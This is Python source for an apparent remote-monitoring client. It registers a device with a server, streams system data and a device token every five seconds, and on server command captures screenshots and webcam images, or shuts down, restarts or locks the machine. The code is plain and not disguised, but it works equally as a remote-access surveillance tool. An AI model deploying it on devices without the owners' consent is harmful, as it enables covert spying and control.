import socketio
import threading
import time
import base64

from webcam import capture_webcam
from screenshot import take_screenshot
from device_id import get_device_id
from device_token import get_device_token
from config import SERVER_URL
from system_info import get_system_info
import commands

sio = socketio.Client()

def send_screenshot():

    image = take_screenshot()

    encoded = base64.b64encode(image).decode()

    sio.emit("screen-update", {
        "deviceId": get_device_id(),
        "image": encoded
    })

def send_live_data():

    while True:

        data = get_system_info()

        data["deviceId"] = get_device_id()
        data["deviceToken"] = get_device_token()

        sio.emit("system-update", data)

        time.sleep(5)

@sio.event
def connect():
    print("Connected to Server")

    device = get_system_info()
    device["deviceId"] = get_device_id()
    device["deviceToken"] = get_device_token()

    sio.emit("register-device", device)

    threading.Thread(target=send_live_data, daemon=True).start()

@sio.event
def disconnect():
    print("Disconnected")

@sio.on("shutdown")
def shutdown():
    print("Shutdown command received")
    commands.shutdown()

@sio.on("restart")
def restart():
    print("Restart command received")
    commands.restart()

@sio.on("lock")
def lock():
    print("LOCK EVENT RECEIVED")
    commands.lock()

@sio.on("request-screenshot")
def request_screenshot():

    print("Taking screenshot...")

    send_screenshot()

@sio.on("request-webcam")
def request_webcam():

    print("Capturing webcam...")

    image = capture_webcam()

    if image:

        sio.emit("webcam-image", {
            "deviceId": get_device_id(),
            "image": image
        })

print("Connecting...")

sio.connect(SERVER_URL)

sio.wait()